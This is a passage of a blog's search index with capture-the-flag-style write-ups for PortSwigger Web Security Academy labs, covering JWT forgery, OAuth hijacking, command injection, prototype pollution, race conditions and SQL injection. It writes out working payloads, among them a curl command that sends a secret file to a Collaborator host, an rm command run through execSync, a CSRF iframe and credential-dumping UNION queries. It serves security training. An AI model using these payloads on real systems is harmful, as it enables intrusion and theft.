After logging into my own account, I sent the post-login GET /my-account request to Burp Repeater and modified the path to /admin. This revealed that the admin panel was only accessible when logged in as the administrator. Next, I navigated to the JWT Editor Keys tab in Burp, generated a new RSA key pair, and saved it. Returning to the GET /admin request in Repeater, I switched to the JSON Web Token tab, modified the sub claim in the payload to administrator, and launched an embedded JWK attack using the generated RSA key. This added a jwk parameter containing my public key to the JWT header. Sending the modified request granted me access to the admin panel. Finally, in the response, I located the endpoint /admin/delete?username=carlos and sent the request to successfully delete Carlos and complete the lab.\n4. Lab: JWT authentication bypass via jku header injection This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.\nTo solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.\nYou can log in to your own account using the following credentials: wiener:peter\nTo solve the lab, I began by loading the JWT Editor extension from the BApp store in Burp. After logging into my own account, I sent the post-login GET /my-account request to Burp Repeater and modified the path to /admin, confirming that the admin panel was only accessible to the administrator. I then generated a new RSA key pair from the JWT Editor Keys tab and saved it. Moving to the exploit server in the browser, I replaced the body with an empty JWK Set and then copied the public key of my generated RSA key as JWK from Burp. I pasted this into the keys array on the exploit server and stored the exploit, resulting in a valid hosted JWK Set.\nNext, I returned to the GET /admin request in Burp Repeater and opened the JSON Web Token tab. In the JWT header, I replaced the kid value with the one from my uploaded JWK and added a new jku parameter pointing to the URL of my hosted JWK Set. In the payload, I modified the sub claim to administrator. I then re-signed the token using my generated RSA key, making sure to keep the header unmodified.\nWith the new valid signature, I sent the request and successfully gained access to the admin panel. Finally, I located the /admin/delete?username=carlos endpoint in the response and sent the request, which deleted Carlos and completed the lab.\n5. Lab: JWT authentication bypass via kid header path traversal This lab uses a JWT-based mechanism for handling sessions. In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.\nTo solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.\nYou can log in to your own account using the following credentials: wiener:peter\nTo solve the lab, I first loaded the JWT Editor extension from the BApp store in Burp. After logging into my own account, I sent the post-login GET /my-account request to Burp Repeater and modified the path to /admin, where I confirmed that the admin panel was restricted to the administrator user. I then went to the JWT Editor Keys tab, created a new symmetric key, and generated it in JWK format. To bypass the restriction on using an empty string, I replaced the generated k property with a Base64-encoded null byte (AA==) before saving the key.\nNext, I returned to the GET /admin request in Burp Repeater and switched to the JSON Web Token tab. In the header, I modified the kid parameter to a path traversal string pointing to /dev/null (../../../../../../../dev/null). In the payload, I changed the sub claim to administrator. At the bottom of the tab, I signed the token using the null-byte symmetric key I had created, making sure the “Don’t modify header” option was selected. This produced a valid signed token. Sending the request granted me access to the admin panel. Finally, I found the /admin/delete?username=carlos endpoint in the response and sent the request, which successfully deleted Carlos and solved the lab.\n6. Lab: JWT authentication bypass via algorithm confusion This lab uses a JWT-based mechanism for handling sessions. It uses a robust RSA key pair to sign and verify tokens. However, due to implementation flaws, this mechanism is vulnerable to algorithm confusion attacks.\nTo solve the lab, first obtain the server\u0026rsquo;s public key. This is exposed via a standard endpoint. Use this key to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.\nYou can log in to your own account using the following credentials: wiener:peter\nTo solve the lab, I began by loading the JWT Editor extension from the BApp store in Burp. After logging into my account, I sent the post-login GET /my-account request to Burp Repeater and modified the path to /admin, confirming that the admin panel could only be accessed by the administrator. I then navigated to the /jwks.json endpoint in the browser and found that the server exposed a JWK Set containing a single public key. I copied the JWK object from inside the keys array for use in the next step.\nNext, in Burp’s JWT Editor Keys tab, I created a new RSA key using the JWK option and pasted the copied JWK into it before saving. I then right-clicked the key entry and selected Copy Public Key as PEM. Using the Decoder tab, I Base64-encoded the PEM key and copied the resulting string. After that, I created a new symmetric key in the JWT Editor Keys tab, replaced the generated k value with the Base64-encoded PEM string, and saved this new key.\nFinally, I went back to the GET /admin request in Repeater and switched to the JSON Web Token tab. In the JWT header, I changed the alg parameter to HS256. In the payload, I modified the sub claim to administrator. I then re-signed the token using the symmetric key created earlier, ensuring the “Don’t modify header” option was selected. Sending this request successfully granted me access to the admin panel. From there, I found the /admin/delete?username=carlos endpoint in the response and sent the request, which deleted Carlos and solved the lab.\n","description":"A collection of portswigger jwt writeups with examples, notes and writeups.","id":13,"section":"Portswigger","tags":["Portswigger","JWT"],"title":"Portswigger JWT Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-jwt/"},{"content":"1.

His email address is carlos@carlos-montoya.net.\nYou can log in with your own social media account using the following credentials: wiener:peter.\nThis application sends the requests and responses that make up the OAuth flow.

Lab: Forced OAuth profile linking This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users\u0026rsquo; accounts.\nTo solve the lab, use a CSRF attack to attach your own social media profile to the admin user\u0026rsquo;s account on the blog website, then access the admin panel and delete carlos.\nThe admin user will open anything you send from the exploit server and they always have an active session on the blog website.\nYou can log in to your own accounts using the following credentials:\nBlog website account: wiener:peter Social media profile: peter.wiener:hotdog While proxying traffic through Burp, I discovered that the blog\u0026rsquo;s social media login flow lacked a state parameter, leaving it vulnerable to CSRF. After linking my social media account, I intercepted the OAuth linking request, copied the GET /oauth-linking?code=[...] URL, and dropped it to keep the code valid. I then crafted an exploit on the exploit server using an iframe that pointed to the stolen URL. When the victim loaded the page, their account was linked to my social media profile, allowing me to log in as the admin via social media authentication. Finally, I accessed the admin panel and deleted Carlos to complete the lab.\nPayload:\n1 \u0026lt;iframe src=\u0026#34;https://0a02004d04d27c1b82a8f68a0031005d.web-security-academy.net/oauth-linking?code=zeliVuDv5hBziRD4lYU7uyWyTepzjpUVVev77AJegsw\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 3. Lab: OAuth account hijacking via redirect_uri This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users\u0026rsquo; accounts.\nTo solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.\nThe admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.\nYou can log in with your own social media account using the following credentials: wiener:peter.\nWhile intercepting traffic through Burp, I clicked on \u0026ldquo;My account\u0026rdquo; and completed the OAuth login process, which redirected me back to the blog website. After logging out and logging back in, I noticed that I was instantly authenticated since my active session with the OAuth provider meant no credentials were required. I then examined the OAuth flow in Burp’s proxy history and found the most recent authorization request beginning with GET /auth?client_id=[...]. This request redirected directly to the redirect_uri along with the authorization code. Sending this request to Burp Repeater, I discovered that I could supply any arbitrary value as the redirect_uri and the server would accept it, reflecting it in the response. By changing the redirect_uri to point to my exploit server and following the redirect, I confirmed in the exploit server\u0026rsquo;s access logs that an authorization code was successfully leaked.\nTo weaponize this, I hosted an iframe on the exploit server that triggered the vulnerable authorization request with my exploit server as the redirect URI. Viewing the exploit showed that the iframe loaded correctly, and my server logs captured the leaked code. Once I delivered this exploit to the victim, their authorization code was also logged on my server. With that stolen code, I logged out of my own session and navigated to /oauth-callback?code=STOLEN-CODE, which completed the OAuth flow and authenticated me as the admin user. From there, I accessed the admin panel and deleted Carlos, successfully solving the lab.\n4. Lab: Stealing OAuth access tokens via an open redirect This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.\nTo solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user\u0026rsquo;s account. Use the access token to obtain the admin\u0026rsquo;s API key and submit the solution using the button provided in the lab banner.\nThe admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.\nYou can log in via your own social media account using the following credentials: wiener:peter.\ndescription\n","description":"A collection of portswigger oauth writeups with examples, notes and writeups.","id":15,"section":"Portswigger","tags":["Portswigger","OAUTH"],"title":"Portswigger OAuth Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-oauth/"},{"content":"1.

Lab: Blind OS command injection with output redirection This lab contains a blind OS command injection vulnerability in the feedback function.\nThe application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:\n/var/www/images/\nThe application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.\nTo solve the lab, execute the whoami command and retrieve the output.\nFor this lab, I will first check which parameter is command injectable using ping and I have go that, email is vulnerable to CMDi. Next I will use whoami and redirect the output to images folder using this command \u0026amp; whoami \u0026gt; /var/www/images/whoami.txt \u0026amp;.\nThere is an LFI in image, leveraging that LFI vulnerability, we will get the output of the whoami command.\nhttps://\u0026lt;lab_id/image?filename=whoami.txt\nSolution: In blind CMDi, if we want to read the output, we have to link CMDi with LFI.\n4 Lab: Blind OS command injection with out-of-band interaction This lab contains a blind OS command injection vulnerability in the feedback function.\nThe application executes a shell command containing the user-supplied details.

Combine these to call alert().\nYou can solve this lab manually in your browser, or use DOM Invader to help you. Using DOM Invader If we check the tab from developers console, we can see we have 2 sources, one is simply changing the property and another one is changing constructor.\nNext we can do is scan for gadgets. When we scan for the gadget, it will open a new tab and so some scanning, and after scan if we go to console, we will see an exploit button.\nJust click on exploit and it will solve the lab with alert.

Let\u0026rsquo;s understand this in more detail now.\nManually If we search something and check the network tab, we will see two requests in particular with js files, that is, searchLogger.js and deparam.js. In seachLogger.js there is this content.\n1 2 3 4 5 6 7 8 9 10 11 12 13 async function searchLogger() { let config = {params: deparam(new URL(location).searchParams.toString())}; if(config.transport_url) { let script = document.createElement(\u0026#39;script\u0026#39;); script.src = config.transport_url; document.body.appendChild(script); } if(config.params \u0026amp;\u0026amp; config.params.search) { await logQuery(\u0026#39;/logger\u0026#39;, config.params); } } This code is getting url parameters and then using transport_url and adding that as the script\u0026rsquo;s source. Now, notice below screenshot carefully.\nWe have added transport_url in proto with the content of abc into it. It tries to fetch the request but it failed and if we look at the console, we will see it is getting populated. Now we have clear idea of what we have to do, let\u0026rsquo;s make an alert.\nSolution: ?__proto__[transport_url]=data:,alert(1);\n2. Lab: DOM XSS via an alternative prototype pollution vector This lab is vulnerable to DOM XSS via client-side prototype pollution. To solve the lab:\nFind a source that you can use to add arbitrary properties to the global Object.prototype. Identify a gadget property that allows you to execute arbitrary JavaScript. Combine these to call alert().\nYou can solve this lab manually in your browser, or use DOM Invader to help you. The lab involves a search functionality where user input is processed by JavaScript. By analyzing the network requests, it was observed that the searchLoggerAlternative.js script handles the search query. The script uses window.manager.sequence, which is not initialized, making it susceptible to prototype pollution.\nBy manipulating the sequence property, it is possible to inject arbitrary properties into the global object. For example, sending a payload like ?__proto__[sequence]=ABC pollutes the sequence property, allowing control over its value. The polluted sequence property is used in an arithmetic operation (a + 1), where a is the value of manager.sequence. By injecting a payload like ?__proto__[sequence]=alert(1), the eval function evaluates the payload, but this results in a syntax error due to improper concatenation. To ensure valid JavaScript syntax, arithmetic operations like + or - can be used. For instance, injecting ?__proto__[sequence]=alert(1)-1 ensures the payload is evaluated correctly. The eval function processes the payload, and the alert(1) is executed, solving the lab.\nSolution: /?__proto__.sequence=alert(1)-\n3. Lab: Client-side prototype pollution via flawed sanitization This lab is vulnerable to DOM XSS via client-side prototype pollution. Although the developers have implemented measures to prevent prototype pollution, these can be easily bypassed.\nTo solve the lab:\nFind a source that you can use to add arbitrary properties to the global Object.prototype. Identify a gadget property that allows you to execute arbitrary JavaScript. Combine these to call alert(). For this lab, we will start by looking at proto.\n/?__proto__[foo]=bar It says undefined, that means we cannot be able to do prototype pollution, let\u0026rsquo;s check source and Checking source We see that it is replacing __proto__, so we will use something like __pro__proto__to__. New payload: /?__pro__proto__to__[foo]=bar We see that the value is getting updated. Next if we check the source, we will see that src is getting populated with transport_url, so we will do alert on that. Final Payload: /?__pro__proto__to__[transport_url]=data:,alert(1); 4. Lab: Client-side prototype pollution in third-party libraries This lab is vulnerable to DOM XSS via client-side prototype pollution. This is due to a gadget in a third-party library, which is easy to miss due to the minified source code. Although it\u0026rsquo;s technically possible to solve this lab manually, we recommend using DOM Invader as this will save you a considerable amount of time and effort.\nTo solve the lab:\nUse DOM Invader to identify a prototype pollution and a gadget for DOM XSS. Use the provided exploit server to deliver a payload to the victim that calls alert(document.cookie) in their browser.\nThis lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Widespread prototype pollution gadgets by Gareth Heyes. To solve the lab, I first opened it in Burp’s built-in browser, enabled DOM Invader, and turned on the prototype pollution option. After reloading the page with DevTools open on the DOM Invader tab, I observed that DOM Invader detected two prototype pollution vectors via the hash property of the URL fragment. I then clicked Scan for gadgets, which opened a new tab where DOM Invader tested the source. Once the scan finished, I opened DevTools again in that tab and saw that DOM Invader had successfully reached the setTimeout() sink using the hitCallback gadget. Clicking Exploit generated a proof-of-concept payload that executed alert(1), confirming exploitation.\nWith this confirmed, I disabled DOM Invader and moved to the exploit server. In the body of the exploit, I crafted a payload to redirect the victim to a malicious URL containing the prototype pollution payload:\n1 2 3 \u0026lt;script\u0026gt; location=\u0026#34;https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)\u0026#34; \u0026lt;/script\u0026gt; I tested this on myself to ensure it navigated me back to the lab’s homepage and triggered alert(document.cookie) as expected. Finally, I delivered the exploit to the victim through the exploit server, which successfully executed the payload and solved the lab.\n5. Lab: Privilege escalation via server-side prototype pollution This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.\nTo solve the lab:\nFind a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype. Identify a gadget property that you can use to escalate your privileges. Access the admin panel and delete the user carlos.\nYou can log in to your own account with the following credentials: wiener:peter After we login, we can able to see there is isAdmin property that is returned from backend, which is false by default. If we add this payload \u0026quot;__proto__\u0026quot;:{ \u0026quot;foo\u0026quot;:\u0026quot;bar\u0026quot; } with request, we can able to change the value of admin in backend and with that we can able to access admin panel.\n6. Lab: Detecting server-side prototype pollution without polluted property reflection This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.\nTo solve the lab, confirm the vulnerability by polluting Object.prototype in a way that triggers a noticeable but non-destructive change in the server\u0026rsquo;s behavior. As this lab is designed to help you practice non-destructive detection techniques, you don\u0026rsquo;t need to progress to exploitation.\nYou can log in to your own account with the following credentials: wiener:peter\nTo solve the lab, I started by logging in and submitting the form to update my billing and delivery address. In Burp’s Proxy \u0026gt; HTTP history, I found the POST /my-account/change-address request, which contained my address details in JSON format. I sent this request to Burp Repeater and confirmed that the server responded with a JSON object representing my user, updated with the new address.\nNext, I tested for prototype pollution by adding a __proto__ property to the request body: \u0026quot;__proto__\u0026quot;: {\u0026quot;foo\u0026quot;: \u0026quot;bar\u0026quot;}.\nThe response didn\u0026rsquo;t reflect the injected property, but I knew that didn\u0026rsquo;t rule out prototype pollution. To investigate further, I broke the JSON syntax by deleting a comma and resent the request. This triggered a 500 error response, but the body included a JSON error object with a status property set to 400.\nWith this clue, I fixed the JSON syntax and attempted to pollute the prototype by injecting my own status value within __proto__: \u0026quot;status\u0026quot;: 555\nAfter sending the request, I received the normal user object response, suggesting the injection didn’t visibly affect the user data. To confirm pollution, I intentionally broke the JSON syntax again and resent the request. This time, the error response showed that both the status and statusCode properties matched my injected value of 555, proving that I had successfully polluted the prototype. This confirmed the vulnerability, and the lab was solved.\n7. Lab: Bypassing flawed input filters for server-side prototype pollution This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.\nTo solve the lab:\nFind a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.

Lab: Remote code execution via server-side prototype pollution This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.\nDue to the configuration of the server, it\u0026rsquo;s possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.\nTo solve the lab:\nFind a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype. Identify a gadget that you can use to inject and execute arbitrary system commands. Trigger remote execution of a command that deletes the file /home/carlos/morale.txt.\nIn this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter Check if there is prototype pollution.\nYes, there is, next we will test if we can get anything on burp collaborator.\n1 \u0026#34;__proto__\u0026#34;: { \u0026#34;execArgv\u0026#34;:[ \u0026#34;--eval=require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;curl https://YOUR-COLLABORATOR-ID.oastify.com\u0026#39;)\u0026#34; ] } Once we will get requests on collaborator, we will simply use rm command in order to delete that file.\n1 \u0026#34;__proto__\u0026#34;: { \u0026#34;execArgv\u0026#34;:[ \u0026#34;--eval=require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;rm /home/carlos/morale.txt\u0026#39;)\u0026#34; ] } 9. Lab: Client-side prototype pollution via browser APIs This lab is vulnerable to DOM XSS via client-side prototype pollution. The website\u0026rsquo;s developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they\u0026rsquo;ve taken.\nTo solve the lab:\nFind a source that you can use to add arbitrary properties to the global Object.prototype. Identify a gadget property that allows you to execute arbitrary JavaScript. Combine these to call alert().\nYou can solve this lab manually in your browser, or use DOM Invader to help you.\nTo solve the lab, I started by loading it in Burp’s built-in browser and enabling DOM Invader along with the prototype pollution option. I then opened the DevTools panel, navigated to the DOM Invader tab, and reloaded the page. DOM Invader identified two prototype pollution vectors in the search property of the query string.\nNext, I clicked Scan for gadgets, which opened a new tab where DOM Invader automatically scanned for exploitable gadgets using the identified source. Once the scan completed, I opened DevTools in that tab, went back to the DOM Invader tab, and confirmed that it had successfully reached the script.src sink via the value gadget.\n10. Lab: Exfiltrating sensitive data via server-side prototype pollution This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.\nDue to the configuration of the server, it\u0026rsquo;s possible to pollute Object.prototype in such a way that you can inject arbitrary system commands that are subsequently executed on the server.\nTo solve the lab:\nFind a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype. Identify a gadget that you can use to inject and execute arbitrary system commands. Trigger remote execution of a command that leaks the contents of Carlos\u0026rsquo;s home directory (/home/carlos) to the public Burp Collaborator server. Exfiltrate the contents of a secret file in this directory to the public Burp Collaborator server. Submit the secret you obtain from the file using the button provided in the lab banner.\nIn this lab, you already have escalated privileges, giving you access to admin functionality. You can log in to your own account with the following credentials: wiener:peter To solve the lab, I first logged into my account and submitted the form to update my billing and delivery address. In Burp’s Proxy \u0026gt; HTTP history, I located the POST /my-account/change-address request and sent it to Repeater. The server responded with my updated user object in JSON format, which confirmed how the application handled address data.\nI then tested for prototype pollution by adding a __proto__ property with a json spaces value. After sending the modified request, I viewed the response in the Raw tab and noticed that the JSON indentation had increased. This clearly showed that the prototype had been polluted successfully.\n\u0026quot;__proto__\u0026quot;: { \u0026quot;json spaces\u0026quot;:10 }\nNext, I explored the admin panel and observed a button for running maintenance jobs. Clicking it triggered background tasks that cleaned up the database and filesystem, which suggested that Node’s child_process.execSync() might be used. To exploit this, I polluted the prototype with malicious properties that modified the execution options, crafting a payload to make a curl request to my Burp Collaborator domain. When I sent this request and triggered the maintenance jobs again, they failed to run. Checking the Collaborator tab revealed several interactions, confirming that I had successfully achieved remote code execution.\n\u0026quot;__proto__\u0026quot;: { \u0026quot;shell\u0026quot;:\u0026quot;vim\u0026quot;, \u0026quot;input\u0026quot;:\u0026quot;:! curl https://YOUR-COLLABORATOR-ID.oastify.com\\n\u0026quot; }\n\u0026quot;input\u0026quot;:\u0026quot;:! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\\n\u0026quot;\nWith this foothold, I turned to exfiltrating sensitive information. I modified my payload to list the contents of Carlos’s home directory and send the results to Collaborator. After triggering the jobs once more, I received a POST request containing Base64-encoded data. Decoding this revealed two entries: node_apps and secret.\nFinally, I adjusted the payload to read and exfiltrate the contents of the /home/carlos/secret file. After sending the request and triggering the maintenance jobs, Collaborator returned another POST request with Base64-encoded data. Decoding it provided me with the secret value. I copied this secret, submitted it in the lab banner, and successfully solved the challenge. ✅\n","description":"A collection of portswigger prototype pollution writeups with examples, notes and writeups.","id":18,"section":"Portswigger","tags":["Portswigger","PROTOTYPE-POLLUTION"],"title":"Portswigger Prototype Pollution Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-prototype-pollution/"},{"content":"1. Lab: Limit overrun race conditions This lab\u0026rsquo;s purchasing flow contains a race condition that enables you to purchase items for an unintended price.\nTo solve the lab, successfully purchase a Lightweight L33t Leather Jacket.\nYou can log in to your account with the following credentials: wiener:peter.\nIn this application, we can use PROMO20 coupon in order to get discount, but there is a race condition in the functionality, so we will add 20 tabs, group them and send request parallelly.\nAfter we send the request, the the total will be below $50.

Lab: Bypassing rate limits via race conditions This lab\u0026rsquo;s login mechanism uses rate limiting to defend against brute-force attacks. However, this can be bypassed due to a race condition.\nTo solve the lab:\nWork out how to exploit the race condition to bypass the rate limit. Successfully brute-force the password for the user carlos. Log in and access the admin panel. Delete the user carlos.\nYou can log in to your account with the following credentials: wiener:peter.

If we get Status code 302, then we got the password for carlos, or else we have to remove the incorrect password and then send the other passwords.\nEventually we will get 302 on one of the password, we will enter that password and login as carlos.\nGoing to admin panel and deleting the user carlos will solve the lab.\nSolution: Use turbo intruder when we have to send custom requests.\n3.

If we do the add giftcard and place the order, and in just a fraction of second between checkout if we add the jacket we can able to purchase the jacket.\nSo what I will do is, buy a giftcard and then send jacket and checkout request parallelly.\nSolution: Race condition in cart while placing the order\n4. Lab: Single-endpoint race conditions This lab\u0026rsquo;s email change feature contains a race condition that enables you to associate an arbitrary email address with your account.\nSomeone with the address carlos@ginandjuice.shop has a pending invite to be an administrator for the site, but they have not yet created an account. Therefore, any user who successfully claims this address will automatically inherit admin privileges.\nTo solve the lab:\nIdentify a race condition that lets you claim an arbitrary email address. Change your email address to carlos@ginandjuice.shop. Access the admin panel. Delete the user carlos You can log in to your own account with the following credentials: wiener:peter.\nYou also have access to an email client, where you can view all emails sent to @exploit-\u0026lt;YOUR-EXPLOIT-SERVER-ID\u0026gt;.exploit-server.net addresses.\nWhen we try to update the account, it says,\nIn order to change it, this is the URL we got in email: /confirm-email?user=wiener\u0026amp;token=EuBHjPRiAXqBNpFk with user and token parameter.\nIf we use carlos@ginandjuice.shop then it will send conformation email to carlos.\nSo we can do something like this, parallelly send two update email, and check what is reflected in the page, if we see change email to carlos then we will look at email client and use the link to change our email to carlos.\nSo we will click on that link, that will change our email to carlos and we will have access to admin panel. Now deleting carlos user will solve the lab.\nSolution: When the user is associated with token, we can able to swap user and token using race condition.\n5. Lab: Partial construction race conditions This lab contains a user registration mechanism. A race condition enables you to bypass email verification and register with an arbitrary email address that you do not own.\nTo solve the lab, exploit this race condition to create an account, then log in and delete the user carlos.\nThe registration system only accepts @ginandjuice.shop emails, and confirmation links are sent there, making it impossible to register without such an account. Reviewing Burp proxy traffic reveals a users.js file that builds the confirmation form and shows the final confirmation request is a POST to /confirm with a token in the query string. By replicating this request in Burp Repeater, you see different responses depending on the token’s value: arbitrary tokens return Incorrect, missing tokens return Missing parameter, and empty tokens return Forbidden, hinting at a patched vulnerability. The behavior suggests a potential race condition where a null token might be valid before it’s stored in the database. Testing with token parameters set to values equivalent to null—like an empty array (token[]=) returns Invalid token: Array, confirming the input bypassed the empty token block and could align with an uninitialized token state.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2 ) confirmationReq = \u0026#39;\u0026#39;\u0026#39;POST /confirm?token[]= HTTP/2 Host: 0ab10056035e12bd80d1dfc700850078.web-security-academy.net Cookie: phpsessionid=YOUR-SESSION-TOKEN Content-Length: 0 \u0026#39;\u0026#39;\u0026#39; for attempt in range(20): currentAttempt = str(attempt) username = \u0026#39;User\u0026#39; + currentAttempt # queue a single registration request engine.queue(target.req, username, gate=currentAttempt) # queue 50 confirmation requests - note that this will probably sent in two separate packets for i in range(50): engine.queue(confirmationReq, gate=currentAttempt) # send all the queued requests for this attempt engine.openGate(currentAttempt) def handleResponse(req, interesting): table.add(req) 6. Lab: Exploiting time-sensitive vulnerabilities This lab contains a password reset mechanism. Although it doesn\u0026rsquo;t contain a race condition, you can exploit the mechanism\u0026rsquo;s broken cryptography by sending carefully timed requests.\nTo solve the lab:\nIdentify the vulnerability in the way the website generates password reset tokens. Obtain a valid password reset token for the user carlos. Log in as carlos. Access the admin panel and delete the user carlos. You can log into your account with the following credentials: wiener:peter.\nIn this application, the reset password functionality is sending token using timestamp, so if we send both of the request at same time, it will give same token. But in order to send it parallelly, we have to use different phpsession and csrf tokens (as the server is processing it consecutively), we will get new phpsession and csrf from GET /forgot-password endpoint. After we have established parallel requests in wiener, we will change on user to carlos.\nThen changing the POST /forgot-password to the data we got from wiener will reset the password for carlos.\nLogin with carlos and deleting the account will solve the lab.\nSolution: Reset password race condition with timestamp as token\n","description":"A collection of portswigger race condition writeups with examples, notes and writeups.","id":19,"section":"Portswigger","tags":["Portswigger","RACE-CONDITION"],"title":"Portswigger Race Condition Writeups","uri":"https://g4nd1v.github.io/portswigger/portswigger-race-condition/"},{"content":"\n1.

Lab: SQL injection vulnerability allowing login bypass This lab contains a SQL injection vulnerability in the login function.\nTo solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.\nThere in my accounts there is a login form and we have to login with administrator. With administrator as username and administrator as password, it gave invalid username or password. The query might be something like this SELECT * FROM users WHERE username = 'administrator' AND password = 'bluecheese'. So if we try to use similar technique from last challenge (using OR query) we can able to solve this challenge too.\nSolution: username will be administrator OR 1=1-- - and password can be anything.\n3.

The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables.\nThe database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user\u0026rsquo;s credentials, then log in to their account.\nNow, in this challenge if we click on any products and scroll down, we can see Check Stock button. We can see the request looks something like this.\nWe have to use to html entity in CyberChef in order to convert our payload into HTML entity to bypass WAF.

Lab: SQL injection attack, querying the database type and version on Oracle This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\nTo solve the lab, display the database version string.\nIt seems we have to grab the banner from the database. So firstly before making any union query, we have to check how many columns are required. So we have to use order by query for that Gifts' ORDER BY 2-- From 3 we are getting error, so we can say, we require 2 columns.\nNow, making simple version union query will solve the lab.\nSolution: Gifts' UNION SELECT banner, NULL FROM v$version-- -\n5. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\nTo solve the lab, display the database version string.\nSimilar to previous challenge, just syntax is different.\nSolution: '+UNION+SELECT+%40%40version,'test'%23\n6. Lab: SQL injection attack, listing the database contents on non-Oracle databases This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables.\nThe application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\nTo solve the lab, log in as the administrator user.\nIn this challenge, we have to get username and password from database. User\u0026rsquo;s table is not given, so we have to use information_schema in order to get tables from database.\nBefore using UNION query, we always have to check how many columns are required. For that we will use Gifts' ORDER BY 1-- query. After ORDER BY 3 we are getting Internal Server Error, so we can say total 2 columns are required in UNION query. Next thing we will do is, use information_schema to retrieve tables - Gifts' UNION SELECT TABLE_CATALOG, TABLE_NAME FROM information_schema.tables--\nWe found the table users_knbmer. Alright, now that we have table, we will find columns using the Gifts' UNION SELECT COLUMN_NAME, NULL FROM information_schema.columns WHERE table_name = 'users_knbmer'-- query.\nGot 2 columns for username and password that is username_mbsmup and password_xwqvyt. Now we have to get username and password from user\u0026rsquo;s table using this query - Gifts' UNION SELECT username_mbsmup, password_xwqvyt from users_knbmer--\nSolution: Login with administrator:gzor4sfsnzq0zoectxhp will solve the lab.\n7. Lab: SQL injection attack, listing the database contents on Oracle This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response so you can use a UNION attack to retrieve data from other tables.\nThe application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.\nTo solve the lab, log in as the administrator user.\nAs as previous challenge, just syntax is different! So starting with UNION query to get required columns and we found 2 columns are required: query Gifts' ORDER BY 1--. Next thing is to get table name: query Gifts' UNION SELECT OWNER, TABLE_NAME FROM all_tables--. Wait a sec, how did I know we have to grab OWNER and TABLE_NAME? You can use online compilers in order to check which what kind of data are present in database. Check this out: https://onecompiler.com/oracle/434u59np3\nMoving to next part, grab column names: Gifts' UNION SELECT TABLE_NAME, COLUMN_NAME FROM all_tab_columns WHERE table_name = 'USERS_ZJOEDW'--. We found username and password USERNAME_CYNJET, PASSWORD_MQKNXO.\nFinal part is to get the content of the columns: Gifts' UNION SELECT USERNAME_CYNJET, PASSWORD_MQKNXO from USERS_ZJOEDW--\nSolution: Login with administrator:qlwc755mwk6ge1qsb6uu will solve the lab.\n8. Lab: SQL injection UNION attack, determining the number of columns returned by the query This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application\u0026rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.\nTo solve the lab, determine the number of columns returned by the 